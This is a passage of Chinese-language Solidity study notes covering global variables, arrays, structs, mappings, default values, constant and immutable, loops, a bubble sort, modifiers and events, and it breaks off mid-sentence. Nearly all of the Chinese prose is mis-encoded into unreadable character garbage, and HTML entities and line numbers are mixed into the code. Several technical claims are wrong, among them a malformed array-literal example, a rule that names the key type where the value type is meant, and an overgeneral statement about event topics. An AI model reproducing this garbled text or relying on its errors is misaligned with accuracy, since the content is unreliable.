å…¨å±€å˜é‡ æ˜¯å…¨å±€èŒƒå›´å·¥ä½œçš„å˜é‡ï¼Œéƒ½æ˜¯solidity é¢„ç•™å…³é”®å­—ã€‚ä»–ä»¬å¯ä»¥åœ¨å‡½æ•°å†…ä¸å£°æ˜ç›´æ¥ä½¿ç”¨ï¼š 123456function global() external view returns(address, uint, bytes memory)&#123; address sender = msg.sender; uint blockNum = block.number; bytes memory data = msg.data; return(sender, blockNum, data);&#125; global() å‡½æ•°ä¸­ï¼Œmsg.sender, block.numberå’Œmsg.dataï¼Œä»–ä»¬åˆ†åˆ«ä»£è¡¨è¯·æ±‚å‘èµ·åœ°å€ï¼Œå½“å‰åŒºå—é«˜åº¦ï¼Œå’Œè¯·æ±‚æ•°æ®ã€‚ blockhash(uint blockNumber): (bytes32)ç»™å®šåŒºå—çš„å“ˆå¸Œå€¼ â€“ åªé€‚ç”¨äº256æœ€è¿‘åŒºå—, ä¸åŒ…å«å½“å‰åŒºå—ã€‚ block.coinbase: (address payable) å½“å‰åŒºå—çŸ¿å·¥çš„åœ°å€ block.gaslimit: (uint) å½“å‰åŒºå—çš„gaslimit block.number: (uint) å½“å‰åŒºå—çš„number block.timestamp: (uint) å½“å‰åŒºå—çš„æ—¶é—´æˆ³ï¼Œä¸ºunixçºªå…ƒä»¥æ¥çš„ç§’ gasleft(): (uint256) å‰©ä½™ gas msg.data: (bytes calldata) å®Œæ•´call data msg.sender: (address payable) æ¶ˆæ¯å‘é€è€… (å½“å‰ caller) msg.sig: (bytes4) calldataçš„å‰å››ä¸ªå­—èŠ‚ (function identifier) msg.value: (uint) å½“å‰äº¤æ˜“å‘é€çš„weiå€¼ 5. å¼•ç”¨ç±»å‹ï¼Œarrary, struct5.1 æ•°ç»„ arraryæ•°ç»„ï¼ˆArraryï¼‰æ˜¯solidity å¸¸ç”¨çš„ä¸€ç§ å˜é‡ç±»å‹ï¼Œç”¨æ¥å­˜å‚¨ä¸€ç»„æ•°æ®ï¼ˆæ•´æ•°ï¼Œ å­—èŠ‚ï¼Œ åœ°å€ç­‰ç­‰ï¼‰ã€‚æ•°ç»„åˆ†ä¸ºå›ºå®šé•¿åº¦æ•°ç»„å’Œå¯å˜é•¿æ•°ç»„ä¸¤ç§ï¼š å›ºå®šé•¿åº¦æ•°ç»„ï¼šåœ¨å£°æ˜æ—¶æŒ‡å®šæ•°ç»„çš„é•¿åº¦ã€‚ç”¨ T[k] çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­T æ˜¯å…ƒç´ çš„ç±»å‹ï¼Œ k æ˜¯é•¿åº¦ï¼Œä¾‹å¦‚ï¼š 1234// å›ºå®šé•¿åº¦ Arrayuint[8] array1;bytes1[5] array2;address[100] array3; å¯å˜é•¿åº¦æ•°ç»„ï¼ˆåŠ¨æ€æ•°ç»„ï¼‰ï¼šåœ¨å£°æ˜æ—¶ä¸æŒ‡å®šæ•°ç»„é•¿åº¦ã€‚ç”¨ T[]çš„æ ¼å¼å£°æ˜ï¼Œå…¶ä¸­ T æ—¶å…ƒç´ çš„ç±»å‹ï¼Œä¾‹å¦‚ï¼ˆbytes æ¯”è¾ƒç‰¹æ®Šï¼Œæ—¶æ•°ç»„ï¼Œä½†æ˜¯ä¸ç”¨jia []ï¼‰ï¼š 12345// å¯å˜é•¿åº¦ Arrayuint[] array4;bytes1[] array5;address[] array6;bytes array7; 5.2 åˆ›å»ºæ•°ç»„çš„è§„åˆ™åœ¨solidity é‡Œï¼Œåˆ›å»ºæ•°ç»„æœ‰ä¸€äº›è§„åˆ™ï¼š å¯¹äº memory ä¿®é¥°çš„ åŠ¨æ€æ•°ç»„ï¼Œå¯ä»¥ç”¨new æ“ä½œç¬¦æ¥åˆ›å»ºï¼Œä½†æ˜¯å¿…é¡»è¦å£°æ˜é•¿åº¦ï¼Œå¹¶ä¸”å£°æ˜åé•¿åº¦ä¸èƒ½æ”¹å˜ã€‚ä¾‹å­ï¼š 123// memoryåŠ¨æ€æ•°ç»„uint[] memory array8 = new uint[](5);bytes memory array9 = new bytes(9); æ•°ç»„å­—é¢å¸¸æ•°ï¼ˆArray Literalsï¼‰æ˜¯å†™ä½œè¡¨è¾¾æ–¹å¼å½¢å¼çš„æ•°ç»„ï¼Œç”¨æ–¹æ‹¬å·åŒ…ç€åˆå§‹åŒ–array çš„ä¸€ç§æ–¹å¼ï¼Œå¹¶ä¸”é‡Œé¢æ¯ä¸€ä¸ªå…ƒç´ çš„type æ˜¯ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†çš„ï¼Œä¾‹å¦‚[1,2,3] é‡Œé¢æ‰€æœ‰çš„å…ƒç´ éƒ½æ˜¯uint8 ç±»å‹ï¼Œ å› ä¸ºåœ¨solidity ä¸­å¦‚æœä¸€ä¸ªå€¼æ²¡æœ‰æŒ‡å®štype çš„è¯ï¼Œé»˜è®¤å°±æ˜¯æœ€å°å•ä½çš„è¯¥typeï¼Œ è¿™é‡Œint çš„é»˜è®¤æœ€å°å•ä½ç±»å‹å°±æ˜¯uint8ã€‚è€Œ[uint(10,2,3)] é‡Œé¢çš„å…ƒç´ éƒ½æ˜¯uint ç±»å‹ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ æŒ‡å®šäº†æ˜¯uint ç±»å‹äº†ï¼Œæˆ‘ä»¬éƒ½ä»¥ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºå‡†ã€‚ä¸‹é¢çš„åˆçº¦ä¸­ï¼Œå¯¹äºf å‡½æ•°é‡Œé¢çš„è°ƒç”¨ï¼Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æ˜¾å¼å¯¹å¯¹ç¬¬ä¸€ä¸ªå…ƒç´ è¿›è¡Œuint å¼ºè½¬çš„è¯ï¼Œæ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸ºå¦‚ä¸Šè¿°æˆ‘ä»¬å…¶å®æ˜¯ä¼ å…¥äº†uint8 ç±»å‹çš„arrayï¼Œå¯æ˜¯g å‡½æ•°éœ€è¦çš„å´æ˜¯uint ç±»å‹çš„arrayé‚£å°±ä¼šæŠ¥é”™ã€‚ 12345678910// SPDX-License-Identifier: GPL-3.0pragma solidity &gt;=0.4.16 &lt;0.9.0;contract C &#123; function f() public pure &#123; g([uint(1), 2, 3]); &#125; function g(uint[3] memory) public pure &#123; // ... &#125;&#125; å¦‚æœæ˜¯åˆ›å»ºçš„æ˜¯åŠ¨æ€æ•°ç»„ï¼Œä½ éœ€è¦ä¸€ä¸ªä¸€ä¸ªçš„èµ‹å€¼ 1234uint[] memory x = new uint[](3);x[0] = 1;x[1] = 3;x[2] = 4; 5.3 æ•°ç»„æˆå‘˜ tipsï¼šæœ‰ç‚¹ç±»ä¼¼Java æ ˆ çš„æ•°æ®ç»“æ„ lengthï¼šæ•°ç»„æœ‰ä¸€ä¸ªåŒ…å«å…ƒç´ æ•°é‡çš„lengthæˆå‘˜ï¼Œmemoryæ•°ç»„çš„é•¿åº¦æ˜¯åˆ›å»ºåå›ºå®šçš„ã€‚ push() ï¼šåŠ¨æ€æ•°ç»„å’Œbytes æ‹¥æœ‰push() æˆå‘˜ï¼Œå¯ä»¥åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ª0å…ƒç´ ã€‚ push(x)ï¼šåŠ¨æ€æ•°ç»„å’Œbytesæ‹¥æœ‰push(x) æˆå‘˜ï¼Œå¯ä»¥åœ¨æ•°ç»„æœ€åæ·»åŠ ä¸€ä¸ªxå…ƒç´ ã€‚ pop()ï¼šåŠ¨æ€æ•°ç»„å’Œbytesæ‹¥æœ‰pop()æˆå‘˜ï¼Œå¯ä»¥ç§»é™¤æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ã€‚ 5.4 ç»“æ„ä½“ struct solidity æ”¯æŒé€šè¿‡æ„é€ ç»“æ„ä½“çš„å½¢å¼å®šä¹‰æ–°çš„ç±»å‹ã€‚åˆ›å»ºç»“æ„ä½“çš„æ–¹æ³•ï¼š 12345// ç»“æ„ä½“struct Student&#123; uint256 id; uint256 score; &#125; ç»™ç»“æ„ä½“èµ‹å€¼çš„ä¸¤ç§æ–¹æ³•ï¼š 1234567891011121314// ç»™ç»“æ„ä½“èµ‹å€¼// æ–¹æ³•1:åœ¨å‡½æ•°ä¸­åˆ›å»ºä¸€ä¸ªstorageçš„structå¼•ç”¨function initStudent1() external&#123; Student storage _student = student; // assign a copy of student _student.id = 11; _student.score = 100;&#125; // æ–¹æ³•2:ç›´æ¥å¼•ç”¨çŠ¶æ€å˜é‡çš„structfunction initStudent2() external&#123; student.id = 1; student.score = 80;&#125; Solidity_day026. æ˜ å°„ç±»å‹ mapping6.1 æ˜ å°„Mapping åœ¨æ˜ å°„ä¸­ï¼Œäººä»¬å¯ä»¥é€šè¿‡é”®ï¼ˆKeyï¼‰æ¥æŸ¥è¯¢å¯¹åº”çš„å€¼ï¼ˆValueï¼‰ï¼Œæ¯”å¦‚ï¼šé€šè¿‡ä¸€ä¸ªäººçš„idæ¥æŸ¥è¯¢ä»–çš„é’±åŒ…åœ°å€ã€‚ å£°æ˜æ˜ å°„çš„æ ¼å¼ä¸ºmapping(_KeyType &#x3D;&gt; _ValueType)ï¼Œå…¶ä¸­ _KeyType å’Œ _ValueType åˆ†åˆ«æ˜¯Key å’Œ Value çš„å˜é‡ç±»å‹ã€‚ ä¾‹ï¼š 12mapping(uint =&gt; address) public idToAddress; // idæ˜ å°„åˆ°åœ°å€mapping(address =&gt; address) public swapPair; // å¸å¯¹çš„æ˜ å°„ï¼Œåœ°å€åˆ°åœ°å€ 6.2 æ˜ å°„çš„è§„åˆ™ è§„åˆ™1 ï¼šæ˜ å°„çš„_KeyType åªèƒ½é€‰æ‹© solidity é»˜è®¤çš„ç±»å‹ï¼Œæ¯”å¦‚uint ï¼Œ address ç­‰ï¼Œä¸èƒ½ç”¨è‡ªå®šä¹‰çš„ç»“æ„ä½“ã€‚è€Œ__KeyType å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„ç±»å‹ã€‚å¦‚ä¸‹ä¾‹å­å°†æŠ¥é”™ï¼ˆä½¿ç”¨äº†è‡ªå®šä¹‰ç»“æ„ä½“ï¼‰ï¼š 123456// æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªç»“æ„ä½“ Structstruct Student&#123; uint256 id; uint256 score; &#125; mapping(Student =&gt; uint) public testVar; è§„åˆ™2ï¼šæ˜ å°„çš„å­˜å‚¨ä½ç½®å¿…é¡»æ˜¯ storageï¼Œå› æ­¤å¯ä»¥ç”¨äºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå‡½æ•°ä¸­çš„ storage å˜é‡ï¼Œå’Œlibrary å‡½æ•°çš„å‚æ•°ã€‚ä¸èƒ½ç”¨public å‡½æ•°çš„å‚æ•°æˆ–è¿”å›ç»“æœä¸­ï¼Œå› ä¸ºmapping è®°å½•çš„æ˜¯ä¸€ç§å…³ç³»(key - value pair)ã€‚ è§„åˆ™3ï¼šå¦‚æœæ˜ å°„å£°æ˜ä¸ºpublic ï¼Œé‚£ä¹ˆsolidity ä¼šè‡ªåŠ¨ç»™ä½ åˆ›å»ºä¸€ä¸ªgetter å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ Key æ¥æŸ¥è¯¢å¯¹åº”çš„Valueã€‚ è§„åˆ™4ï¼šç»™æ˜ å°„æ–°å¢çš„é”®å€¼å¯¹çš„è¯­æ³•ä¸º _Var[_Key] &#x3D; _Valueï¼Œå…¶ä¸­ _Var æ˜¯æ˜ å°„å˜é‡åï¼Œ _Key å’Œ _Value å¯¹åº”æ–°å¢ çš„é”®å€¼å¯¹ã€‚ä¾‹ï¼š 123function writeMap (uint _Key, address _Value) public&#123; idToAddress[_Key] = _Value;&#125; 6.3 æ˜ å°„çš„åŸç† åŸç†1ï¼šæ˜ å°„ä¸å­˜å‚¨ä»»ä½•é”®ï¼ˆKeyï¼‰çš„èµ„è®¯ï¼Œä¹Ÿæ²¡æœ‰lengthçš„èµ„è®¯ã€‚ï¼ˆä¸æ˜¯å¾ˆç†è§£è¿™ä¸ªèµ„è®¯æ˜¯ä»€ä¹ˆæ„æ€ï¼‰ åŸç†2ï¼šæ˜ å°„ä½¿ç”¨keccake256(key) å½“æˆoffset è·å– value åŸç†3ï¼šå› ä¸ºEthereum ä¼šå®šä¹‰æ‰€æœ‰æœªä½¿ç”¨çš„ç©ºé—´ä¸º0; æ‰€æœ‰ä¸ºèµ‹å€¼ï¼ˆValueï¼‰çš„é”®ï¼ˆKeyï¼‰åˆå§‹å€¼éƒ½æ˜¯0 7. å˜é‡åˆå§‹å€¼7.1 å€¼ç±»å‹åˆå§‹å€¼ booleanï¼šfalse stringï¼šâ€â€ int: 0 uint: 0 enumï¼šæšä¸¾ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´  address: 0x0000000000000000000000000000000000000000 æˆ– address(0) function: internal: ç©ºç™½æ–¹ç¨‹ externalï¼šç©ºç™½æ–¹ç¨‹ å¯ä»¥ç”¨public å˜é‡çš„ getter å‡½æ•°éªŒè¯ä¸Šé¢å†™çš„åˆå§‹å€¼æ˜¯å¦æ­£ç¡®ï¼š 1234567891011bool public _bool; // falsestring public _string; // &quot;&quot;int public _int; // 0uint public _uint; // 0address public _address; // 0x0000000000000000000000000000000000000000enum ActionSet &#123; Buy, Hold, Sell&#125;ActionSet public _enum; // ç¬¬ä¸€ä¸ªå…ƒç´  0function fi() internal&#123;&#125; // internalç©ºç™½æ–¹ç¨‹ function fe() external&#123;&#125; // externalç©ºç™½æ–¹ç¨‹ 7.2å¼•ç”¨ç±»å‹åˆå§‹å€¼ æ˜ å°„mappingï¼šæ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„mapping ç»“æ„ä½“structï¼šæ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“ æ•°ç»„arrary åŠ¨æ€æ•°ç»„ï¼š[] é™æ€æ•°ç»„ï¼ˆå®šé•¿ï¼‰: æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„ å¯ç”¨publicå˜é‡çš„getter å‡½æ•°éªŒè¯ä¸Šé¢å†™çš„åˆå§‹å€¼æ˜¯å¦æ­£ç¡®ï¼š 12345678910// Reference Typesuint[8] public _staticArray; // æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„é™æ€æ•°ç»„[0,0,0,0,0,0,0,0]uint[] public _dynamicArray; // `[]`mapping(uint =&gt; address) public _mapping; // æ‰€æœ‰å…ƒç´ éƒ½ä¸ºå…¶é»˜è®¤å€¼çš„mapping// æ‰€æœ‰æˆå‘˜è®¾ä¸ºå…¶é»˜è®¤å€¼çš„ç»“æ„ä½“ 0, 0struct Student&#123; uint256 id; uint256 score; &#125;Student public student; 7.3 delete æ“ä½œç¬¦delete a ä¼šè®©å˜é‡ a çš„å€¼å˜ä¸ºåˆå§‹å€¼ 12345// deleteæ“ä½œç¬¦bool public _bool2 = true; function d() external &#123; delete _bool2; // delete ä¼šè®©_bool2å˜ä¸ºé»˜è®¤å€¼ï¼Œfalse&#125; 8. å¸¸æ•° constant å’Œ immutabletipsï¼š constantï¼ˆå¸¸é‡ï¼‰å’Œ immutableï¼ˆä¸å˜é‡ï¼‰ã€‚çŠ¶æ€å˜é‡å£°æ˜è¿™ä¸¤ä¸ªå…³é”®å­—ä¹‹åï¼Œä¸èƒ½åœ¨åˆçº¦åæ›´æ”¹æ•°å€¼ï¼›å¹¶ä¸”è¿˜å¯ä»¥èŠ‚çœgasã€‚å¦å¤–ï¼Œåªæœ‰æ•°å€¼å˜é‡å¯ä»¥å£°æ˜ constant å’Œ immutableï¼›string å’Œ bytes å¯ä»¥å£°æ˜ä¸ºconstantï¼Œä½†ä¸èƒ½ä¸º immutableã€‚ 8.1 constantå’Œ immutableconstant constant å˜é‡ å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åå†ä¹Ÿä¸èƒ½æ”¹å˜ã€‚å°è¯•æ”¹å˜çš„è¯ï¼Œç¼–è¯‘ä¸é€šè¿‡ã€‚ 12345// constantå˜é‡å¿…é¡»åœ¨å£°æ˜çš„æ—¶å€™åˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜uint256 constant CONSTANT_NUM = 10;string constant CONSTANT_STRING = &quot;0xAA&quot;;bytes constant CONSTANT_BYTES = &quot;WTF&quot;;address constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000; immutable immutable å˜é‡å¯ä»¥åœ¨å£°æ˜æ—¶æˆ–æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ï¼Œå› æ­¤æ›´åŠ çµæ´» 12345// immutableå˜é‡å¯ä»¥åœ¨constructoré‡Œåˆå§‹åŒ–ï¼Œä¹‹åä¸èƒ½æ”¹å˜uint256 public immutable IMMUTABLE_NUM = 9999999999;address public immutable IMMUTABLE_ADDRESS;uint256 public immutable IMMUTABLE_BLOCK;uint256 public immutable IMMUTABLE_TEST; ä½¿ç”¨å…¨å±€å˜é‡ address(this), block.numberä½œä¸ºå€¼ï¼Œä¸¾ä¾‹ 1234567891011// åˆ©ç”¨constructoråˆå§‹åŒ–immutableå˜é‡ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨constructor()&#123; IMMUTABLE_ADDRESS = address(this); IMMUTABLE_BLOCK = block.number; IMMUTABLE_TEST = test();&#125; function test() public pure returns(uint256)&#123; uint256 what = 9; return(what);&#125; 9.æ§åˆ¶æµ solidityå®ç°æ’åºç®—æ³•9.1 æ§åˆ¶æµsolidity çš„æ§åˆ¶æµä¸å…¶ä»–è¯­è¨€ç±»ä¼¼ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š 1.if - else 1234567function ifElseTest(uint256 _number) public pure returns(bool)&#123; if(_number == 0)&#123; return(true); &#125;else&#123; return(false); &#125;&#125; 2.for å¾ªç¯ 1234567function forLoopTest() public pure returns(uint256)&#123; uint sum = 0; for(uint i = 0; i &lt; 10; i++)&#123; sum += i; &#125; return(sum);&#125; 3.whileå¾ªç¯ 123456789function whileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; while(i &lt; 10)&#123; sum += i; i++; &#125; return(sum);&#125; 4.do-whileå¾ªç¯ 123456789function doWhileTest() public pure returns(uint256)&#123; uint sum = 0; uint i = 0; do&#123; sum += i; i++; &#125;while(i &lt; 10); return(sum);&#125; 5.ä¸‰å…ƒè¿ç®—ç¬¦ 12345// ä¸‰å…ƒè¿ç®—ç¬¦ ternary/conditional operatorfunction ternaryTest(uint256 x, uint256 y) public pure returns(uint256)&#123; // return the max of x and y return x &gt;= y ? x: y; &#125; tips: continueï¼ˆç«‹å³è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯ï¼‰å’Œ break ï¼ˆç»“æŸå½“å‰å¾ªç¯ï¼‰å’Œå…¶ä»–è¯­è¨€ç±»ä¼¼ 9.2 ç®€å•çš„ä½¿ç”¨solidityå®ç°ä¸€ä¸ªå†’æ³¡æ’åºtipsï¼š è¿™é‡Œå¦‚æœ ç´¢å¼•å˜æˆè´Ÿæ•°æ±‡æŠ¥é”™çš„ï¼Œè€Œä¸”æ•°ç»„è¦åŠ å­˜å‚¨ä½ç½® å¦‚memory é”™è¯¯å¦‚å›¾ï¼š 12345678910111213141516171819202122232425// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; function bubSort(uint[] memory arr) external pure returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 10. æ„é€ å‡½æ•°å’Œä¿®é¥°å™¨tipsï¼šæœ‰å…³åˆçº¦æ§åˆ¶æƒï¼ˆOwnableï¼‰ 10.1 æ„é€ å‡½æ•°æ„é€ å‡½æ•°ï¼ˆconstructorï¼‰æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œæ¯ä¸€ä¸ªåˆçº¦å¯ä»¥å®šä¹‰ä¸€ä¸ªï¼Œå¹¶åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™è‡ªåŠ¨è¿è¡Œä¸€æ¬¡ã€‚å®ƒä¸€èˆ¬ç”¨äºåˆå§‹åŒ–åˆçº¦çš„ä¸€äº›å‚æ•°ï¼Œä¾‹å¦‚åˆå§‹åˆçº¦çš„owneråœ°å€ï¼š 123456address owner; // å®šä¹‰ownerå˜é‡// æ„é€ å‡½æ•°constructor() &#123; owner = msg.sender; // åœ¨éƒ¨ç½²åˆçº¦çš„æ—¶å€™ï¼Œå°†ownerè®¾ç½®ä¸ºéƒ¨ç½²è€…çš„åœ°å€&#125; æ³¨æ„ï¼šæ„é€ å‡½æ•°åœ¨ä¸åŒçš„solidityç‰ˆæœ¬ä¸­çš„è¯­æ³•æ˜¯æ¯”ä¸éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåœ¨solidity0.4.22ä¹‹å‰ï¼Œæ„é€ å‡½æ•°ä¸ä½¿ç”¨ constructor è€Œæ˜¯ä½¿ç”¨ä¸åˆçº¦åŒåçš„å‡½æ•°ä½œä¸ºæ„é€ å‡½æ•°æ¥ä½¿ç”¨ï¼Œç”±äºè¿™ç§æ—§å†™æ³•å®¹æ˜“ä½¿å¼€å‘è€…ä¹¦å†™æ—¶å‘ç”Ÿç–æ¼ï¼Œæ‰€ä»¥åœ¨0.4.22ç‰ˆæœ¬ä¹‹åï¼Œé‡‡ç”¨äº†construtorå†™æ³• æ„é€ å‡½æ•°çš„æ—§å†™æ³•ï¼š 123456pragma solidity =0.4.21;contract Parents &#123; // ä¸åˆçº¦åParentsåŒåçš„å‡½æ•°å°±æ˜¯æ„é€ å‡½æ•° function Parents () public &#123; &#125;&#125; 10. 2ä¿®é¥°å™¨ä¿®é¥°å™¨ï¼ˆmodifierï¼‰å’Œ solidity ç‰¹æœ‰çš„è¯­æ³•ï¼Œç±»ä¼¼äºé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„ decoratorï¼Œ å£°æ˜å‡½æ•°æ‹¥æœ‰çš„ç‰¹æ€§ï¼Œå¹¶å‡å°‘ä»£ç çš„å†—ä½™ã€‚modifier çš„ä¸»è¦ä½¿ç”¨åœºæ™¯æ—¶è¿è¡Œå‡½æ•°å‰çš„æ£€æŸ¥ï¼Œä¾‹å¦‚åœ°å€ï¼Œå˜é‡ï¼Œä½™é¢ç­‰ ä¿®é¥°å™¨modifierçš„å®šä¹‰ï¼š 12345// å®šä¹‰modifiermodifier onlyOwner &#123; require(msg.sender == owner); // æ£€æŸ¥è°ƒç”¨è€…æ˜¯å¦ä¸ºowneråœ°å€ _; // å¦‚æœæ˜¯çš„è¯ï¼Œç»§ç»­è¿è¡Œå‡½æ•°ä¸»ä½“ï¼›å¦åˆ™æŠ¥é”™å¹¶revertäº¤æ˜“&#125; å¸¦æœ‰onlyOwner ä¿®é¥°ç¬¦çš„å‡½æ•°åªèƒ½è¢« owner åœ°å€è°ƒç”¨ï¼Œå¦‚ï¼š 123function changeOwner(address _newOwner) external onlyOwner&#123; owner = _newOwner; // åªæœ‰owneråœ°å€è¿è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå¹¶æ”¹å˜owner&#125; è§£è¯»ï¼šchangeOwner() å‡½æ•°ï¼Œè¿è¡Œå®ƒæ˜¯å¯ä»¥æ”¹å˜åˆçº¦çš„ownerï¼Œä½†æ˜¯ç”±äºonlyOwner ä¿®é¥°ç¬¦çš„å­˜åœ¨ï¼Œåªæœ‰åŸå…ˆçš„owner å¯ä»¥è°ƒç”¨ï¼Œåˆ«äººè°ƒç”¨éƒ½ä¼šæŠ¥é”™ã€‚è¿™æ˜¯æœ€å¸¸ç”¨çš„æ§åˆ¶æ™ºèƒ½åˆçº¦æƒé™çš„æ–¹æ³•ã€‚ OppenZepplinçš„Ownable æ ‡å‡†å®ç°ï¼šoppenzepplin æ˜¯ä¸€ä¸ªç»´æŠ¤solidityæ ‡å‡†åŒ–ä»£ç åº“çš„ç»„ç»‡ï¼Œä»–çš„Ownable æ ‡å‡†å®ç°ä¸º: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol æ¼”ç¤º1ï¼š ç”¨å½“å‰åœ°å€è°ƒç”¨test å‡½æ•°æˆåŠŸï¼š åˆ‡æ¢åœ°å€è°ƒç”¨å‡½æ•°test ï¼Œå¤±è´¥ ä»£ç ï¼š 1234567891011121314151617181920// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Modifier &#123; address public owner; constructor() &#123; owner = msg.sender; &#125; modifier _onlyOwner &#123; require(msg.sender == owner, &quot;You are not owner&quot;); _; &#125; function test() external _onlyOwner &#123; &#125;&#125; æ¼”ç¤º2ï¼ˆç ”ç©¶æ‰§è¡Œé¡ºåºï¼‰ï¼š æˆ‘å…ˆæŸ¥çœ‹countçš„å€¼ï¼Œç„¶åè°ƒç”¨ï¼ŒtestModå‡½æ•°ï¼Œæ‰“å¼€äº¤æ˜“è¯¦æƒ…ï¼Œè§‚å¯Ÿåˆ°countçš„å€¼å˜æˆ2ï¼Œå†æ¬¡æŸ¥çœ‹countçš„å€¼ï¼Œcount &#x3D; 12ï¼Œ è¯´æ˜ count +&#x3D;10 æ˜¯åœ¨å‡½æ•°testMod æ‰§è¡Œä¹‹åå†æ‰§è¡Œçš„ ç¤ºæ„å›¾ï¼š 11.äº‹ä»¶tipsï¼šERC20ä»£å¸ä¸ºä¾‹ï¼ˆERC20åé¢åœ¨å­¦ï¼Œè¦å­¦ä¼šä¸æ‡‚è£…æ‡‚ï¼‰ 11.1 äº‹ä»¶solidityçš„äº‹ä»¶ï¼ˆeventï¼‰æ˜¯EVMä¸Šæ—¥å¿—çš„æŠ½è±¡ï¼Œå®ƒå…·æœ‰è¿ä¸ªç‰¹ç‚¹ï¼š å“åº”ï¼šåº”ç”¨ç¨‹åºï¼ˆether.jsï¼‰å¯ä»¥é€šè¿‡RPC æ¥å£è®¢é˜…å’Œç›‘å¬è¿™äº›äº‹ä»¶ï¼Œå¹¶åœ¨å‰ç«¯åšå“åº” ç»æµï¼šäº‹ä»¶æ˜¯EVM ä¸Šæ¯”è¾ƒç»æµçš„å­˜å‚¨æ•°æ®çš„æ–¹å¼ï¼Œæ¯ä¸ªå¤§æ¦‚æ¶ˆè€—2000gasï¼›ç›¸æ¯”ä¹‹ä¸‹ï¼Œé“¾ä¸Šå­˜å‚¨ä¸€ä¸ªæ–°å˜é‡è‡³å°‘éœ€è¦20000gas 11.2è§„åˆ™äº‹ä»¶çš„å£°æ˜ç”±event å…³é”®å­—å¼€å¤´ï¼Œç„¶åè·Ÿäº‹ä»¶åç§°ï¼Œæ‹¬å·é‡Œé¢å†™å¥½äº‹ä»¶éœ€è¦è®°å½•çš„å˜é‡ç±»å‹å’Œå˜é‡åã€‚ä»¥ERC20ä»£å¸åˆçº¦çš„Transfer äº‹ä»¶ä¸ºä¾‹ï¼š 1event Transfer(address indexed from, address indexed to, uint256 value); è§£è¯»ï¼š Transfer äº‹ä»¶å…±è®°å½•äº†3ä¸ªå˜é‡fromï¼Œto å’Œ valueï¼Œåˆ†åˆ«å¯¹åº”ä»£å¸çš„è½¬è´¦åœ°å€ï¼Œæ¥æ”¶åœ°å€å’Œè½¬è´¦æ•°é‡ åŒæ—¶from å’Œ to å‰é¢å¸¦ç€ indexed å…³é”®å­—ï¼Œæ¯ä¸ªindexedæ ‡è®°çš„å˜é‡å¯ä»¥ç†è§£ä¸ºæ£€ç´¢äº‹ä»¶çš„ç´¢å¼•â€é”®â€ï¼Œåœ¨ä»¥å¤ªåŠå•ç‹¬ä½œä¸ºä¸€ä¸ªtopicè¿›è¡Œå­˜å‚¨å’Œç´¢å¼•ï¼Œç¨‹åºå¯ä»¥è½»æ¾çš„ç­›é€‰å‡ºç‰¹å®šè½¬è´¦åœ°å€å’Œæ¥æ”¶åœ°å€äº‹ä»¶ã€‚æ¯ä¸ªäº‹ä»¶æœ€å¤šä¸‰ä¸ªå¸¦indexed çš„å˜é‡ã€‚æ¯ä¸ªindexedå˜é‡çš„å¤§å°ä¸ºå›ºå®šçš„256æ¯”ç‰¹ã€‚äº‹ä»¶çš„å“ˆå¸Œä»¥åŠè¿™ä¸‰ä¸ªå¸¦æœ‰indexedçš„å˜é‡åœ¨EVMæ—¥å¿—é€šå¸¸è¢«å­˜å‚¨ä¸ºtopicã€‚å…¶ä¸­topic[0] æ˜¯æ­¤äº‹ä»¶çš„keccak256 å“ˆå¸Œï¼Œtopic[1] åˆ° topic[3] å­˜å‚¨äº†indexed å˜é‡çš„ keccak256 å“ˆå¸Œã€‚ value å’Œ indexed å…³é”®å­—ï¼Œä¼šå­˜å‚¨åœ¨äº‹ä»¶çš„dataéƒ¨åˆ†ä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºäº‹ä»¶çš„â€å€¼â€ã€‚data éƒ¨åˆ†çš„å˜é‡ä¸èƒ½è¢«ç›´æ¥æ£€ç´¢ï¼Œä½†å¯ä»¥å­˜å‚¨ä»»æ„å¤§å°çš„æ•°æ®ã€‚å› 